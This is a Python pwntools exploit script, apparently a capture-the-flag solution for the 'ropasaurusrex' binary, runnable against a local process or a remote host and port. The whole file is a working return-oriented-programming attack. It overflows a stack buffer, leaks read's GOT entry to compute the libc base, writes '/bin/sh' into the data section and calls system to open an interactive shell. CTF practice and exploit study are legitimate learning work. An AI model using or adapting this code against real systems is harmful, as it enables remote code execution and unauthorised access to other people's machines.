#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']

#gdb_bool = True
gdb_bool = False

def exploit(r):

    system_offset = 0x3ADA0
    read_offset = 0xD5980
    read_got = 0x804961C
    write_call = 0x804830C
    pppr = 0x080484b6
    read_got = 0x804961C
    read_call = 0x804832C 
    main = 0x804841D
    data = 0x8049620

    buf = ""
    buf += "A" *cyclic_find("kaab")
    buf += p32(write_call)
    buf += p32(pppr)
    buf += p32(1)
    buf += p32(read_got)
    buf += p32(4)
    #buf += p32(main)
    buf += p32(read_call)
    buf += p32(pppr)
    buf += p32(0)
    buf += p32(data)
    buf += p32(8)
    buf += p32(main)






    r.sendline(buf)

    addr_read_got = u32(r.recvn(4))
    base = addr_read_got - read_offset
    system = base + system_offset
    print("reads got entry: ", hex(addr_read_got))
    print("base of libc: ", hex(base))
    print("system: ", hex(system))

    #buf2 = ""
    #buf2 += "A" *cyclic_find("kaab")

    #r.sendline(buf)

    r.send("/bin/sh\x00")

    buf2 = ""
    buf2 += "A" *cyclic_find("kaab")
    buf2 += p32(system)
    buf2 += "BBBB"
    buf2 += p32(data)
    r.sendline(buf2)
    r.interactive()
    return


if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./ropasaurusrex"        #put binary name here
    e = ELF(binary_name)
    #libc = ELF("./libc.so.6")
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name, env={"LD_PRELOAD" : "./libc.so.6"})
        print util.proc.pidof(r)
        gdb_cmd = [
            "b *0x804841C",
            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)
